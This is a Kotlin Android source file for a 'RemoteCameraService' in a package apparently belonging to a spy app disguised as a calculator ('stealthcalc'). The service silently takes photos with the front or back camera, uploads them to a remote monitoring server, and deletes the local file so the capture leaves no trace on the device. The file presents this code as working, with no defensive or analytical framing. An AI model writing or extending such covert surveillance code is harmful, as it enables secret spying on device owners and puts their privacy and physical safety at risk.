package com.stealthcalc.monitoring.service

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeout
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume

@Singleton
class RemoteCameraService @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) ==
                PackageManager.PERMISSION_GRANTED

    private fun ensureThread() {
        if (cameraThread == null) {
            cameraThread = HandlerThread("RemoteCamera").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }
    }

    @Suppress("MissingPermission")
    suspend fun capturePhoto(useFrontCamera: Boolean): Boolean {
        if (!hasPermission()) return false
        ensureThread()

        val handler = cameraHandler ?: return false
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val facing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK

        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return false

        val width = if (useFrontCamera) 640 else 1280
        val height = if (useFrontCamera) 480 else 960
        val reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)

        val latch = CountDownLatch(1)
        var capturedBytes: ByteArray? = null

        reader.setOnImageAvailableListener({ imgReader ->
            val image = imgReader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            capturedBytes = ByteArray(buffer.remaining())
            buffer.get(capturedBytes!!)
            image.close()
            latch.countDown()
        }, handler)

        runCatching {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(reader.surface)
                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    }
                    camera.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.capture(request.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        result: android.hardware.camera2.TotalCaptureResult
                                    ) {
                                        session.close()
                                        camera.close()
                                    }
                                }, handler)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close()
                                latch.countDown()
                            }
                        },
                        handler
                    )
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
            }, handler)
        }.onFailure {
            AppLogger.log(context, "[agent]", "Remote camera error: ${it.message}")
            reader.close()
            return false
        }

        latch.await(5, TimeUnit.SECONDS)
        reader.close()

        val bytes = capturedBytes ?: return false
        val side = if (useFrontCamera) "front" else "back"
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "remote_${side}_$timestamp.jpg")
        file.writeBytes(bytes)

        val success = uploader.uploadFile(
            file = file,
            mimeType = "image/jpeg",
            category = "remote_camera_$side",
            capturedAt = System.currentTimeMillis(),
        )
        file.delete()

        if (success) {
            AppLogger.log(context, "[agent]", "Remote $side camera capture uploaded")
        }
        return success
    }

    fun release() {
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }
}
